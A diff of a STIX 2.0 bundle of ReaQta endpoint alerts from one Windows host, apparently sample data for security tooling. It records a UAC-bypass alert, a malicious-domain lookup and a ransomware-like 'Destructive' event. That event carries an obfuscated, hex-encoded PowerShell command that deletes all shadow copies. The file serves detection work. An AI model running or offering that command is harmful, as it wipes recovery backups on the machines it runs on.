@@ -1,240 +1,238 @@
 {
+  "type": "bundle",
   "id": "6fb563a5-3f3b-4886-90a8-a93d211487a4",
+  "spec_version": "2.0",
   "objects": [
     {
-      "created": "2023-01-27T12:25:25.038000Z",
-      "first_observed": "2023-01-27T12:25:25.038000Z",
+      "type": "identity",
       "id": "identity--fa188421-a904-4e95-a3a4-309a558b9295",
       "identity_class": "system",
-      "last_observed": "2023-01-27T12:25:25.038000Z",
-      "modified": "2023-01-27T12:25:25.038000Z",
       "name": "reaqta",
-      "type": "identity"
+      "created": "2022-12-12T15:32:42.038Z",
+      "modified": "2022-12-12T15:32:42.038Z"
     },
-    {
-      "created": "2023-01-27T12:26:25.038000Z",
-      "created_by_ref": "identity--676051e7-3b63-419e-8180-ef0fa497d73b",
-      "first_observed": "2023-01-27T12:26:25.038000Z",
-      "id": "observed-data--32d5272c-5b44-48e9-a22c-4bb1d6f0992e",
-      "last_observed": "2023-01-27T12:26:25.038000Z",
-      "modified": "2023-01-27T12:26:25.038000Z",
-      "number_observed": 1,
-      "objects": {
+	{
+    "id": "observed-data--32d5272c-5b44-48e9-a22c-4bb1d6f0992e",
+    "type": "observed-data",
+    "created_by_ref": "identity--676051e7-3b63-419e-8180-ef0fa497d73b",
+    "created": "2022-12-12T15:32:20.890Z",
+    "modified": "2022-12-12T15:32:20.890Z",
+    "objects": {
         "0": {
-          "action": "Network Connection Established",
-          "category": "8",
-          "code": 900024717988069400,
-          "created": "2023-01-27T12:26:25.038000Z",
-          "file_ref": "6",
-          "network_ref": "10",
-          "parent_process_ref": "4",
-          "process_ref": "3",
-          "type": "x-oca-event",
-          "user_ref": "8"
+            "type": "x-oca-event",
+            "code": 900024717988069400,
+            "file_ref": "6",
+            "user_ref": "8",
+            "process_ref": "3",
+            "parent_process_ref": "4",
+            "network_ref": "10",
+            "category": "8",
+            "action": "Network Connection Established",
+            "created": "2022-12-12T15:32:54.419Z"
         },
         "1": {
-          "host_id": "900022840986697728",
-          "ip_refs": [
-            "11"
-          ],
-          "type": "x-oca-asset"
+            "type": "x-oca-asset",
+            "host_id": "900022840986697728",
+            "ip_refs": [
+                "11"
+            ]
         },
         "2": {
-          "local_id": "900024693602387969",
-          "type": "x-reaqta-event"
+            "type": "x-reaqta-event",
+            "local_id": "900024693602387969"
         },
         "3": {
-          "binary_ref": "6",
-          "created": "2023-01-27T12:26:25.038000Z",
-          "creator_user_ref": "8",
-          "extensions": {
-            "windows-process-ext": {
-              "owner_sid": "S-1-5-21-979315260-1110968185-3366233752-1001"
-            },
-            "x-reaqta-process": {
-              "logon_id": "0x154e77",
-              "no_gui": false,
-              "privilege_level": "LOW"
+            "type": "process",
+            "x_unique_id": "900022840986697728:6548:1661182434862",
+            "binary_ref": "6",
+            "creator_user_ref": "8",
+            "pid": 6548,
+            "created": "2022-12-12T15:32:54.862Z",
+            "parent_ref": "4",
+            "extensions": {
+                "windows-process-ext": {
+                    "owner_sid": "S-1-5-21-979315260-1110968185-3366233752-1001"
+                },
+                "x-reaqta-process": {
+                    "privilege_level": "LOW",
+                    "no_gui": false,
+                    "logon_id": "0x154e77"
+                }
             }
-          },
-          "parent_ref": "4",
-          "pid": 6548,
-          "type": "process",
-          "x_unique_id": "900022840986697728:6548:1661182434862"
         },
         "4": {
-          "pid": 6572,
-          "type": "process",
-          "x_unique_id": "900022840986697728:6572:1661182381981"
+            "type": "process",
+            "x_unique_id": "900022840986697728:6572:1661182381981",
+            "pid": 6572
         },
         "5": {
-          "path": "c:\\users\\fadams\\appdata\\roaming\\bittorrent\\updates\\7.10.5_46211",
-          "type": "directory"
+            "type": "directory",
+            "path": "c:\\users\\fadams\\appdata\\roaming\\bittorrent\\updates\\7.10.5_46211"
         },
         "6": {
-          "extensions": {
-            "x-reaqta-program": {
-              "arch": "x32",
-              "fsname": "bittorrentie.exe"
+            "type": "file",
+            "parent_directory_ref": "5",
+            "name": "remoteie.exe",
+            "hashes": {
+                "MD5": "0eb34002d91ec0e59b90e6eb922895cb",
+                "SHA-1": "1fc53d114fbe6c2d8d56e5b375304e3986cfdf2e",
+                "SHA-256": "65f32777d56a9bc778800492a9b1db40b6dbfde54628405808c276556e7c3ab8"
+            },
+            "size": 550440,
+            "extensions": {
+                "x-reaqta-program": {
+                    "arch": "x32",
+                    "fsname": "bittorrentie.exe"
+                }
             }
-          },
-          "hashes": {
-            "MD5": "0eb34002d91ec0e59b90e6eb922895cb",
-            "SHA-1": "1fc53d114fbe6c2d8d56e5b375304e3986cfdf2e",
-            "SHA-256": "65f32777d56a9bc778800492a9b1db40b6dbfde54628405808c276556e7c3ab8"
-          },
-          "name": "remoteie.exe",
-          "parent_directory_ref": "5",
-          "size": 550440,
-          "type": "file"
         },
         "7": {
-          "extensions": {
-            "x-reaqta-cert": {
-              "expired": false,
-              "signer": "BitTorrent Inc",
-              "trusted": true
-            }
-          },
-          "issuer": "Symantec Class 3 SHA256 Code Signing CA",
-          "type": "x509-certificate"
+            "type": "x509-certificate",
+            "extensions": {
+                "x-reaqta-cert": {
+                    "signer": "BitTorrent Inc",
+                    "trusted": true,
+                    "expired": false
+                }
+            },
+            "issuer": "Symantec Class 3 SHA256 Code Signing CA"
         },
         "8": {
-          "type": "user-account",
-          "user_id": "fadams"
+            "type": "user-account",
+            "user_id": "fadams"
         },
         "9": {
-          "dst_ip_ref": "12",
-          "extensions": {
-            "x-reaqta-alert": {
-              "incidents": [
-                "900023950459799554"
-              ],
-              "triggered_incidents": []
-            }
-          },
-          "src_ip_ref": "11",
-          "type": "x-ibm-finding"
+            "type": "x-ibm-finding",
+            "extensions": {
+                "x-reaqta-alert": {
+                    "incidents": [
+                        "900023950459799554"
+                    ],
+                    "triggered_incidents": []
+                }
+            },
+            "src_ip_ref": "11",
+            "dst_ip_ref": "12"
         },
         "10": {
-          "dst_port": 443,
-          "dst_ref": "12",
-          "extensions": {
-            "x-reaqta-network": {
-              "address_family": "IPv4",
-              "outbound": true
-            }
-          },
-          "protocols": [
-            "tcp"
-          ],
-          "src_port": 56742,
-          "src_ref": "11",
-          "type": "network-traffic"
+            "type": "network-traffic",
+            "extensions": {
+                "x-reaqta-network": {
+                    "address_family": "IPv4",
+                    "outbound": true
+                }
+            },
+            "protocols": [
+                "tcp"
+            ],
+            "src_port": 56742,
+            "dst_port": 443,
+            "src_ref": "11",
+            "dst_ref": "12"
         },
         "11": {
-          "type": "ipv4-addr",
-          "value": "192.168.6.242"
+            "type": "ipv4-addr",
+            "value": "192.168.6.242"
         },
         "12": {
-          "type": "ipv4-addr",
-          "value": "45.155.205.233"
+            "type": "ipv4-addr",
+            "value": "45.155.205.233"
         }
-      },
-      "type": "observed-data"
     },
+    "first_observed": "2022-12-12T15:32:43.724Z",
+    "last_observed": "2022-12-12T15:32:43.724Z",
+    "number_observed": 1
+},
     {
-      "created": "2023-01-27T12:27:25.038000Z",
-      "created_by_ref": "identity--fa188421-a904-4e95-a3a4-309a558b9295",
-      "first_observed": "2023-01-27T12:27:25.038000Z",
       "id": "observed-data--d3e1a58a-ecd5-4cd8-bd67-8b220fc455ce",
-      "last_observed": "2023-01-27T12:27:25.038000Z",
-      "modified": "2023-01-27T12:27:25.038000Z",
-      "number_observed": 1,
+      "type": "observed-data",
+      "created_by_ref": "identity--fa188421-a904-4e95-a3a4-309a558b9295",
+      "created": "2022-12-12T15:33:43.724Z",
+      "modified": "2022-12-12T15:33:43.724Z",
       "objects": {
         "0": {
-          "action": "UACBypass2",
-          "created": "2023-01-27T12:27:25.038000Z",
-          "host_ref": "9",
-          "outcome": "A malicious process launched that's likely attempting a User Account Control (UAC) bypass. Review the process tree.",
-          "parent_process_ref": "7",
+          "type": "x-oca-event",
+          "created": "2022-12-12T15:33:39Z",
           "process_ref": "2",
-          "provider": "ReaQta",
+          "action": "UACBypass2",
+          "outcome": "A malicious process launched that's likely attempting a User Account Control (UAC) bypass. Review the process tree.",
           "severity": 70,
-          "type": "x-oca-event"
+          "parent_process_ref": "7",
+          "host_ref": "9",
+          "provider": "ReaQta"
         },
         "1": {
-          "hashes": {
-            "MD5": "73b7a0103cb74d7f763ff7f43b95168a",
-            "SHA-256": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16"
-          },
+          "type": "file",
           "name": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe",
           "parent_directory_ref": "3",
-          "type": "file"
+          "hashes": {
+            "SHA-256": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16",
+            "MD5": "73b7a0103cb74d7f763ff7f43b95168a"
+          }
         },
         "2": {
+          "type": "process",
           "binary_ref": "1",
+          "name": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe",
           "command_line": "\"C:\\Users\\fadams\\Downloads\\6252822930423808\\e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe\" ",
           "creator_user_ref": "5",
-          "name": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe",
-          "parent_ref": "7",
           "pid": 22472903178,
-          "type": "process"
+          "parent_ref": "7"
         },
         "3": {
-          "path": "\\Device\\HarddiskVolume4\\Users\\fadams\\Downloads\\6252822930423808\\e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe",
-          "type": "directory"
+          "type": "directory",
+          "path": "\\Device\\HarddiskVolume4\\Users\\fadams\\Downloads\\6252822930423808\\e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe"
         },
         "4": {
-          "agent_local_time": "2023-01-27T12:27:25.038000Z",
-          "agent_version": "6.22.13607.0",
-          "confidence": 80,
-          "detection_id": "ldt:0a3e7f1d15874c09ad37dae363774e50:21477405166",
-          "first_seen": "2023-01-27T12:27:25.038000Z",
-          "ioc_value": "VMware, Inc.",
-          "last_seen": "2023-01-27T12:27:25.038000Z",
-          "platform_id": "0",
+          "type": "x-reaqta",
           "scenario": "privilege_escalation",
           "tactic": "Privilege Escalation",
           "tactic_id": "TA0004",
           "technique": "Bypass User Account Control",
           "technique_id": "T1548.002",
-          "type": "x-reaqta"
+          "confidence": 80,
+          "detection_id": "ldt:0a3e7f1d15874c09ad37dae363774e50:21477405166",
+          "agent_local_time": "2022-12-12T15:33:04.627Z",
+          "agent_version": "6.22.13607.0",
+          "ioc_value": "VMware, Inc.",
+          "first_seen": "2022-12-12T15:33:12Z",
+          "last_seen": "2022-12-12T15:33:42Z",
+          "platform_id": "0"
         },
         "5": {
-          "account_login": "fadams",
           "type": "user-account",
+          "account_login": "fadams",
           "user_id": "A-2-3-4-333-444-222-1001"
         },
         "6": {
+          "type": "file",
           "hashes": {
-            "MD5": "b5a6d2fb3f4521c37d613de52ab3467d",
-            "SHA-256": "f95b7ba752c6452da9d83f84ca7307ae079d220718bcb2babf145903bac894dd"
-          },
-          "type": "file"
+            "SHA-256": "f95b7ba752c6452da9d83f84ca7307ae079d220718bcb2babf145903bac894dd",
+            "MD5": "b5a6d2fb3f4521c37d613de52ab3467d"
+          }
         },
         "7": {
+          "type": "process",
           "binary_ref": "6",
           "command_line": "C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}",
-          "pid": 22456494518,
-          "type": "process"
+          "pid": 22456494518
         },
         "8": {
           "type": "ipv4-addr",
           "value": "45.155.205.233"
         },
         "9": {
-          "hostname": "Frank-PC",
+          "type": "x-oca-asset",
           "ip_refs": [
             "8",
             "10"
           ],
+          "hostname": "Frank-PC",
           "mac_refs": [
             "11"
           ],
-          "os_platform": "Windows",
           "os_version": "Windows 10",
-          "type": "x-oca-asset"
+          "os_platform": "Windows"
         },
         "10": {
           "type": "ipv4-addr",
@@ -245,101 +243,101 @@
           "value": "00:0a:11:f1:00:0x"
         }
       },
-      "type": "observed-data"
+      "first_observed": "2022-12-12T15:33:39Z",
+      "last_observed": "2022-12-12T15:33:39Z",
+      "number_observed": 1
     },
-    {
-      "created": "2023-01-27T12:28:25.038000Z",
-      "created_by_ref": "identity--fa188421-a904-4e95-a3a4-309a558b9295",
-      "first_observed": "2023-01-27T12:28:25.038000Z",
+	    {
       "id": "observed-data--5b858b41-d98a-4912-bd7d-6e8bc2a0d9a3",
-      "last_observed": "2023-01-27T12:28:25.038000Z",
-      "modified": "2023-01-27T12:28:25.038000Z",
-      "number_observed": 1,
+      "type": "observed-data",
+      "created_by_ref": "identity--fa188421-a904-4e95-a3a4-309a558b9295",
+      "created": "2022-12-12T15:34:43.724Z",
+      "modified": "2022-12-12T15:34:43.724Z",
       "objects": {
         "0": {
-          "action": "library load",
-          "created": "2023-01-27T12:28:25.038000Z",
-          "file_ref": "12",
-          "host_ref": "9",
-          "outcome": "This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.",
-          "parent_process_ref": "7",
+          "type": "x-oca-event",
+          "created": "2022-12-12T15:34:39Z",
           "process_ref": "2",
-          "provider": "ReaQta",
+          "outcome": "This file meets the machine learning-based on-sensor AV protection's high confidence threshold for malicious files.",
           "severity": 70,
-          "type": "x-oca-event"
+          "parent_process_ref": "7",
+          "host_ref": "9",
+          "file_ref": "12",
+          "action": "library load",
+          "provider": "ReaQta"
         },
         "1": {
-          "hashes": {
-            "MD5": "73b7a0103cb74d7f763ff7f43b95168a",
-            "SHA-256": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16"
-          },
+          "type": "file",
           "name": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe",
           "parent_directory_ref": "3",
-          "type": "file"
+          "hashes": {
+            "SHA-256": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16",
+            "MD5": "73b7a0103cb74d7f763ff7f43b95168a"
+          }
         },
         "2": {
+          "type": "process",
           "binary_ref": "1",
+          "name": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe",
           "command_line": "\"C:\\Users\\fadams\\Downloads\\6252822930423808\\e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe\" ",
           "creator_user_ref": "5",
-          "name": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe",
-          "parent_ref": "7",
           "pid": 22472903178,
-          "type": "process"
+          "parent_ref": "7"
         },
         "3": {
-          "path": "\\Device\\HarddiskVolume4\\Users\\fadams\\Downloads\\6252822930423808\\e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe",
-          "type": "directory"
+          "type": "directory",
+          "path": "\\Device\\HarddiskVolume4\\Users\\fadams\\Downloads\\6252822930423808\\e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe"
         },
         "4": {
-          "agent_local_time": "2023-01-27T12:28:25.038000Z",
-          "agent_version": "6.22.13607.0",
-          "confidence": 70,
-          "detection_id": "ldt:0a3e7f1d15874c09ad37dae363774e50:21477405166",
-          "first_seen": "2023-01-27T12:28:25.038000Z",
-          "ioc_value": "VMware, Inc.",
-          "last_seen": "2023-01-27T12:28:25.038000Z",
-          "platform_id": "0",
+          "type": "x-reaqta",
           "scenario": "NGAV",
           "tactic": "Machine Learning",
           "tactic_id": "CSTA0004",
           "technique": "Sensor-based ML",
           "technique_id": "CST0007",
-          "type": "x-reaqta"
+          "confidence": 70,
+          "detection_id": "ldt:0a3e7f1d15874c09ad37dae363774e50:21477405166",
+          "agent_local_time": "2022-12-12T15:34:04.627Z",
+          "agent_version": "6.22.13607.0",
+          "ioc_value": "VMware, Inc.",
+          "first_seen": "2022-12-12T15:34:12Z",
+          "last_seen": "2022-12-12T15:34:42Z",
+          "platform_id": "0"
         },
         "5": {
-          "account_login": "fadams",
           "type": "user-account",
+          "account_login": "fadams",
           "user_id": "A-2-3-4-333-444-222-1001"
         },
         "6": {
+          "type": "file",
           "hashes": {
-            "MD5": "b5a6d2fb3f4521c37d613de52ab3467d",
-            "SHA-256": "f95b7ba752c6452da9d83f84ca7307ae079d220718bcb2babf145903bac894dd"
-          },
-          "type": "file"
+            "SHA-256": "f95b7ba752c6452da9d83f84ca7307ae079d220718bcb2babf145903bac894dd",
+            "MD5": "b5a6d2fb3f4521c37d613de52ab3467d"
+          }
         },
         "7": {
+          "type": "process",
           "binary_ref": "6",
           "command_line": "C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}",
-          "pid": 22456494518,
-          "type": "process"
+          "pid": 22456494518
         },
         "8": {
           "type": "ipv4-addr",
           "value": "45.155.205.233"
         },
         "9": {
-          "hostname": "Frank-PC",
+          "type": "x-oca-asset",
           "ip_refs": [
             "8",
             "10"
           ],
+          "hostname": "Frank-PC",
           "mac_refs": [
             "11"
           ],
-          "os_platform": "Windows",
           "os_version": "Windows 10",
-          "type": "x-oca-asset"
+          "os_platform": "Windows"
         },
         "10": {
           "type": "ipv4-addr",
@@ -350,107 +348,107 @@
           "value": "00:0a:11:f1:00:0x"
         },
         "12": {
+          "type": "file",
           "hashes": {
             "SHA-256": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16"
-          },
-          "type": "file"
+          }
         }
       },
-      "type": "observed-data"
+      "first_observed": "2022-12-12T15:34:39Z",
+      "last_observed": "2022-12-12T15:34:39Z",
+      "number_observed": 1
     },
-    {
-      "created": "2023-01-27T12:29:25.038000Z",
-      "created_by_ref": "identity--fa188421-a904-4e95-a3a4-309a558b9295",
-      "first_observed": "2023-01-27T12:29:25.038000Z",
+	   {
       "id": "observed-data--30a91c57-fc2b-4dea-986d-885088490592",
-      "last_observed": "2023-01-27T12:29:25.038000Z",
-      "modified": "2023-01-27T12:29:25.038000Z",
-      "number_observed": 1,
+      "type": "observed-data",
+      "created_by_ref": "identity--fa188421-a904-4e95-a3a4-309a558b9295",
+      "created": "2022-12-12T15:35:43.725Z",
+      "modified": "2022-12-12T15:35:43.725Z",
       "objects": {
         "0": {
+          "type": "x-oca-event",
+          "created": "2022-12-12T15:35:49Z",
+          "process_ref": "2",
           "action": "IntelDomainMedium",
-          "created": "2023-01-27T12:29:25.038000Z",
+          "outcome": "A domain lookup matched a ReaQta Intelligence indicator.",
+          "severity": 50,
+          "parent_process_ref": "7",
           "host_ref": "9",
           "network_ref": "13",
-          "outcome": "A domain lookup matched a ReaQta Intelligence indicator.",
-          "parent_process_ref": "7",
-          "process_ref": "2",
-          "provider": "ReaQta",
-          "severity": 50,
-          "type": "x-oca-event"
+          "provider": "ReaQta"
         },
         "1": {
-          "hashes": {
-            "MD5": "73b7a0103cb74d7f763ff7f43b95168a",
-            "SHA-256": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16"
-          },
+          "type": "file",
           "name": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe",
           "parent_directory_ref": "3",
-          "type": "file"
+          "hashes": {
+            "SHA-256": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16",
+            "MD5": "73b7a0103cb74d7f763ff7f43b95168a"
+          }
         },
         "2": {
+          "type": "process",
           "binary_ref": "1",
+          "name": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe",
           "command_line": "\"C:\\Users\\fadams\\Downloads\\6252822930423808\\e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe\" ",
           "creator_user_ref": "5",
-          "name": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe",
-          "parent_ref": "7",
           "pid": 22472903178,
-          "type": "process"
+          "parent_ref": "7"
         },
         "3": {
-          "path": "\\Device\\HarddiskVolume4\\Users\\fadams\\Downloads\\6252822930423808\\e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe",
-          "type": "directory"
+          "type": "directory",
+          "path": "\\Device\\HarddiskVolume4\\Users\\fadams\\Downloads\\6252822930423808\\e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe"
         },
         "4": {
-          "agent_local_time": "2023-01-27T12:29:25.038000Z",
-          "agent_version": "6.22.13607.0",
-          "confidence": 80,
-          "detection_id": "ldt:0a3e7f1d15874c09ad37dae363774e50:21477405166",
-          "first_seen": "2023-01-27T12:29:25.038000Z",
-          "ioc_value": "VMware, Inc.",
-          "last_seen": "2023-01-27T12:29:25.038000Z",
-          "platform_id": "0",
+          "type": "x-reaqta",
           "scenario": "intel_detection",
           "tactic": "Falcon Intel",
           "tactic_id": "CSTA0007",
           "technique": "Intelligence Indicator - Domain",
           "technique_id": "CST0018",
-          "type": "x-reaqta"
+          "confidence": 80,
+          "detection_id": "ldt:0a3e7f1d15874c09ad37dae363774e50:21477405166",
+          "agent_local_time": "2022-12-12T15:35:04.627Z",
+          "agent_version": "6.22.13607.0",
+          "ioc_value": "VMware, Inc.",
+          "first_seen": "2022-12-12T15:35:12Z",
+          "last_seen": "2022-12-12T15:35:42Z",
+          "platform_id": "0"
         },
         "5": {
-          "account_login": "fadams",
           "type": "user-account",
+          "account_login": "fadams",
           "user_id": "A-2-3-4-333-444-222-1001"
         },
         "6": {
+          "type": "file",
           "hashes": {
-            "MD5": "b5a6d2fb3f4521c37d613de52ab3467d",
-            "SHA-256": "f95b7ba752c6452da9d83f84ca7307ae079d220718bcb2babf145903bac894dd"
-          },
-          "type": "file"
+            "SHA-256": "f95b7ba752c6452da9d83f84ca7307ae079d220718bcb2babf145903bac894dd",
+            "MD5": "b5a6d2fb3f4521c37d613de52ab3467d"
+          }
         },
         "7": {
+          "type": "process",
           "binary_ref": "6",
           "command_line": "C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}",
-          "pid": 22456494518,
-          "type": "process"
+          "pid": 22456494518
         },
         "8": {
           "type": "ipv4-addr",
           "value": "45.155.205.233"
         },
         "9": {
-          "hostname": "Frank-PC",
+          "type": "x-oca-asset",
           "ip_refs": [
             "8",
             "10"
           ],
+          "hostname": "Frank-PC",
           "mac_refs": [
             "11"
           ],
-          "os_platform": "Windows",
           "os_version": "Windows 10",
-          "type": "x-oca-asset"
+          "os_platform": "Windows"
         },
         "10": {
           "type": "ipv4-addr",
@@ -465,104 +463,104 @@
           "value": "catsdegree.com"
         },
         "13": {
-          "dst_ref": "12",
-          "type": "network-traffic"
+          "type": "network-traffic",
+          "dst_ref": "12"
         }
       },
-      "type": "observed-data"
+      "first_observed": "2022-12-12T15:35:49Z",
+      "last_observed": "2022-12-12T15:35:49Z",
+      "number_observed": 1
     },
-    {
-      "created": "2023-01-27T12:30:25.038000Z",
-      "created_by_ref": "identity--fa188421-a904-4e95-a3a4-309a558b9295",
-      "first_observed": "2023-01-27T12:30:25.038000Z",
+	    {
       "id": "observed-data--7819a74a-5f9f-499c-bf8c-eb50a6a37b32",
-      "last_observed": "2023-01-27T12:30:25.038000Z",
-      "modified": "2023-01-27T12:30:25.038000Z",
-      "number_observed": 1,
+      "type": "observed-data",
+      "created_by_ref": "identity--fa188421-a904-4e95-a3a4-309a558b9295",
+      "created": "2022-12-12T15:36:43.727Z",
+      "modified": "2022-12-12T15:36:43.727Z",
       "objects": {
         "0": {
-          "action": "MaliciousPowershell",
-          "created": "2023-01-27T12:30:25.038000Z",
-          "host_ref": "9",
-          "outcome": "A PowerShell script related to this process is likely malicious or shares characteristics with known malicious scripts. Review the script.",
-          "parent_process_ref": "7",
+          "type": "x-oca-event",
+          "created": "2022-12-12T15:36:53Z",
           "process_ref": "2",
-          "provider": "ReaQta",
+          "action": "MaliciousPowershell",
+          "outcome": "A PowerShell script related to this process is likely malicious or shares characteristics with known malicious scripts. Review the script.",
           "severity": 50,
-          "type": "x-oca-event"
+          "parent_process_ref": "7",
+          "host_ref": "9",
+          "provider": "ReaQta"
         },
         "1": {
-          "hashes": {
-            "MD5": "7353f60b1739074eb17c5f4dddefe239",
-            "SHA-256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c"
-          },
+          "type": "file",
           "name": "powershell.exe",
           "parent_directory_ref": "3",
-          "type": "file"
+          "hashes": {
+            "SHA-256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c",
+            "MD5": "7353f60b1739074eb17c5f4dddefe239"
+          }
         },
         "2": {
+          "type": "process",
           "binary_ref": "1",
+          "name": "powershell.exe",
           "command_line": "powershell -ep bypass -c \"(0..61)|%{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))};iex $s\"",
           "creator_user_ref": "5",
-          "name": "powershell.exe",
-          "parent_ref": "7",
           "pid": 22475614444,
-          "type": "process"
+          "parent_ref": "7"
         },
         "3": {
-          "path": "\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-          "type": "directory"
+          "type": "directory",
+          "path": "\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
         },
         "4": {
-          "agent_local_time": "2023-01-27T12:30:25.038000Z",
-          "agent_version": "6.22.13607.0",
-          "confidence": 80,
-          "detection_id": "ldt:0a3e7f1d15874c09ad37dae363774e50:21477405166",
-          "first_seen": "2023-01-27T12:30:25.038000Z",
-          "ioc_value": "VMware, Inc.",
-          "last_seen": "2023-01-27T12:30:25.038000Z",
-          "platform_id": "0",
+          "type": "x-reaqta",
           "scenario": "suspicious_activity",
           "tactic": "Execution",
           "tactic_id": "TA0002",
           "technique": "PowerShell",
           "technique_id": "T1059.001",
-          "type": "x-reaqta"
+          "confidence": 80,
+          "detection_id": "ldt:0a3e7f1d15874c09ad37dae363774e50:21477405166",
+          "agent_local_time": "2022-12-12T15:36:04.627Z",
+          "agent_version": "6.22.13607.0",
+          "ioc_value": "VMware, Inc.",
+          "first_seen": "2022-12-12T15:36:12Z",
+          "last_seen": "2022-12-12T15:36:42Z",
+          "platform_id": "0"
         },
         "5": {
-          "account_login": "fadams",
           "type": "user-account",
+          "account_login": "fadams",
           "user_id": "A-2-3-4-333-444-222-1001"
         },
         "6": {
+          "type": "file",
           "hashes": {
-            "MD5": "73b7a0103cb74d7f763ff7f43b95168a",
-            "SHA-256": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16"
-          },
-          "type": "file"
+            "SHA-256": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16",
+            "MD5": "73b7a0103cb74d7f763ff7f43b95168a"
+          }
         },
         "7": {
+          "type": "process",
           "binary_ref": "6",
           "command_line": "\"C:\\Users\\fadams\\Downloads\\6252822930423808\\e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe\" ",
-          "pid": 22472903178,
-          "type": "process"
+          "pid": 22472903178
         },
         "8": {
           "type": "ipv4-addr",
           "value": "45.155.205.233"
         },
         "9": {
-          "hostname": "Frank-PC",
+          "type": "x-oca-asset",
           "ip_refs": [
             "8",
             "10"
           ],
+          "hostname": "Frank-PC",
           "mac_refs": [
             "11"
           ],
-          "os_platform": "Windows",
           "os_version": "Windows 10",
-          "type": "x-oca-asset"
+          "os_platform": "Windows"
         },
         "10": {
           "type": "ipv4-addr",
@@ -573,96 +571,96 @@
           "value": "00:0a:11:f1:00:0x"
         }
       },
-      "type": "observed-data"
+      "first_observed": "2022-12-12T15:36:53Z",
+      "last_observed": "2022-12-12T15:36:53Z",
+      "number_observed": 1
     },
-    {
-      "created": "2023-01-27T12:31:25.038000Z",
-      "created_by_ref": "identity--fa188421-a904-4e95-a3a4-309a558b9295",
-      "first_observed": "2023-01-27T12:31:25.038000Z",
+	    {
       "id": "observed-data--77382665-4552-427a-a011-641f40e50e7f",
-      "last_observed": "2023-01-27T12:31:25.038000Z",
-      "modified": "2023-01-27T12:31:25.038000Z",
-      "number_observed": 1,
+      "type": "observed-data",
+      "created_by_ref": "identity--fa188421-a904-4e95-a3a4-309a558b9295",
+      "created": "2022-12-12T15:37:43.728Z",
+      "modified": "2022-12-12T15:37:43.728Z",
       "objects": {
         "0": {
-          "action": "Destructive",
-          "created": "2023-01-27T12:31:25.038000Z",
-          "host_ref": "9",
-          "outcome": "A suspicious process, associated with potentially destructive malware like ransomware, launched. Review the process tree. ",
-          "parent_process_ref": "7",
+          "type": "x-oca-event",
+          "created": "2022-12-12T15:37:24Z",
           "process_ref": "2",
-          "provider": "ReaQta",
+          "action": "Destructive",
+          "outcome": "A suspicious process, associated with potentially destructive malware like ransomware, launched. Review the process tree. ",
           "severity": 90,
-          "type": "x-oca-event"
+          "parent_process_ref": "7",
+          "host_ref": "9",
+          "provider": "ReaQta"
         },
         "1": {
+          "type": "file",
           "name": "powershell.exe",
-          "parent_directory_ref": "3",
-          "type": "file"
+          "parent_directory_ref": "3"
         },
         "2": {
+          "type": "process",
           "binary_ref": "1",
+          "name": "powershell.exe",
           "command_line": "powershell -ep bypass -c \"(0..61)|%{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))};iex $s\"",
